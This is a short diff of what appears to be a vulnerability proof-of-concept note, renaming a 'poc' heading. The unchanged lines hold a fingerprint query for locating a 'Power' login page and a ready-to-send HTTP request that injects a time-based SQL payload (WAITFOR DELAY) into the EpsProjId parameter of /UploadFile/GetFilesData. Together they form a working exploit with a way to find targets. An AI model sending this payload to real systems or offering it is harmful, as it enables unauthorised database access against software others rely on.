@@ -8,7 +8,7 @@
 body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
 ```
 
-## poc
+## POC
 ```
 GET /UploadFile/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:5%27--&StartDate=2&EndDate=2 HTTP/1.1
 Host: [已模糊处理]
